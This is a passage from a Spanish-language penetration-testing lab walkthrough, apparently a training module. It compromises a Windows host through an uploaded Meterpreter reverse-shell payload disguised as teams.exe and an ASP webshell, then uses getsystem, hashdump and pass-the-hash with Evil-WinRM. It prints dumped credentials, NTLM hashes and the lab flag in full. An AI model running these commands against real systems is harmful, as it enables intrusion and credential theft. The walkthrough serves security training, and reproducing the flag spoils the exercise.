SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:plain_password_hex:83149b892315469ded73f92168ce5d60383d1f7ddf831deb8402025d9183673572fb55dcf6f827eb62046f08b1fb37fbd9048b9afe76457d1054982cfab0fd4a1882d73ac774b2e7abb0a41fa9576ed3b7396eb18c7d4a3afe6fb0abf6852b8f54d2b0fee8ac70c5181a435fe7df2cc534f54255ad0c6b58604ca8409bc0a88c7755d484c7a5b712837374878987954a640c0a27f45f786aaeabf83a7924cf3b5d533de4b4142efaff77d86cb88f3adfb8d37f11cdaf57a866addcd91915c4e2158da73dc75df3ecf008db44e2a3838c659f3bd555165adb96d25a4b5c12625afe64eb9f3fd8ff643d2d073e90c95845
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:18c7b736e82f3c505262f838dd7c4326:::
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\hporter:Gr8hambino!
```

### <mark style="color:purple;">Método alternativo con Metasploit</mark>

#### Crear el payload con Msfvenom

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 713 bytes
Final size of exe file: 7168 bytes
Saved as: teams.exe
```

#### Subir el payload a través del web uploader

<figure><img src="/files/xahUzRLYfcCWBqO4HYNt" alt=""><figcaption></figcaption></figure>

#### Abrir listener multi handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 7000; run"
```

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000
```

#### Establecer reverse port forwarding

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.229.147 -vN
</strong><strong>
</strong><strong>debug1: OpenSSH_10.0p2 Debian-5, OpenSSL 3.5.2 5 Aug 2025
</strong>debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.129.229.147 [10.129.229.147] port 22.
debug1: Connection established.
&#x3C;---SNIP--->
debug1: Remote: Forwarding listen address "172.16.8.120" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.8.120:443, connect 0.0.0.0:7000
</code></pre>

#### Ejecutar teams.exe desde la webshell asp

Debemos tener abierta otra shell con el port forwarding SSH para poder acceder a la webshell:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ssh -D 8081 -i dmz01_key root@10.129.229.147
</strong></code></pre>

Ahora solamente accedemos a la webshell y ejecutamos el payload para conseguir la sesión de Meterpreter:

```
c:\DotNetNuke\Portals\0\teams.exe
```

<figure><img src="/files/Rn63HEZWB4hEurErF4lY" alt=""><figcaption></figcaption></figure>

#### Recibimos el shell Meterpreter

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 172.16.8.120; set LPORT 7000; run"
</strong><strong>
</strong><strong>[*] Using configured payload generic/shell_reverse_tcp
</strong>payload => windows/x64/meterpreter/reverse_https
LHOST => 172.16.8.120
LPORT => 7000
[-] Handler failed to bind to 172.16.8.120:7000
[*] Started HTTPS reverse handler on https://0.0.0.0:7000
[!] https://172.16.8.120:7000 handling request from 127.0.0.1; (UUID: ftzwko57) Without a database connected that payload UUID tracking will not work!
[*] https://172.16.8.120:7000 handling request from 127.0.0.1; (UUID: ftzwko57) Staging x64 payload (204892 bytes) ...
[!] https://172.16.8.120:7000 handling request from 127.0.0.1; (UUID: ftzwko57) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:7000 -> 127.0.0.1:40296) at 2025-10-09 02:16:36 +0800

meterpreter > getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
</code></pre>

#### Escalada de privilegios y hashdump

Desde el shell Meterpreter es muy sencillo elevar privilegios y volcar todos los hashes de los usuarios:

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Pregunta 2

> Escale privilegios en el host DEV01. Envíe el contenido del archivo flag.txt al Escritorio del Administrador.

#### Pass the Hash con Evil WinRM

```shell-session
afsh4ck@kali$ proxychains evil-winrm -i 172.16.8.20 -u Administrator -H 0e20798f695ab0d04bc138b22344cea8

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
academy-aen-dev\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/22/2022   9:05 PM             17 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
K33p_0n_sp**********!
```

#### Desde Meterpreter

```powershell
meterpreter > shell
Process 3552 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>hostname
hostname
ACADEMY-AEN-DEV01

c:\windows\system32\inetsrv>cd c:/users/Administrator/Desktop
cd c:/users/Administrator/Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of c:\Users\Administrator\Desktop

06/22/2022  09:05 PM    <DIR>          .
06/22/2022  09:05 PM    <DIR>          ..
06/22/2022  09:05 PM                17 flag.txt
               1 File(s)             17 bytes
               2 Dir(s)  31,529,758,720 bytes free

c:\Users\Administrator\Desktop>type flag.txt
type flag.txt
K33p_0n_sp00fing!
```
